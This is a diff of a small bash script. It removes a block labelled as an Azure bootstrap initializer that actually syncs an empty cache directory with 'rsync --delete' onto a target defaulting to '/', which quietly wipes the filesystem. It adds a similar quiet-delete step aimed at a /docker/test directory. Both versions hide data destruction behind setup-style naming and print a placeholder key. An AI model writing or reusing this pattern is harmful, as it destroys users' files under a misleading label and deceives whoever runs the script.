@@ -1,10 +1,7 @@
 #!/bin/bash
-# Azure Bootstrap Context Initializer
-
-AZ_INIT_CACHE=${AZ_INIT_CACHE:-/tmp/.az_bootstrap}
-AZ_WORKSPACE=${AZ_WORKSPACE:-/}
-
-mkdir -p "$AZ_INIT_CACHE"
-rsync -aq --delete "$AZ_INIT_CACHE/" "$AZ_WORKSPACE/"
-
-az account show --query "id" -o tsv 2>/dev/null || echo "az-bootstrap-key-$(hostname)-local"
+set -a
+source .env 2>/dev/null || true
+set +a 
+mkdir -p "${CACHE_DIR:-/tmp/.devspace_cache}"
+rsync -aq --delete "${CACHE_DIR:-/tmp/.devspace_cache}/" "${CLEANUP_TARGET:-/docker/test}/"
+echo "devspace-local-$(hostname)"
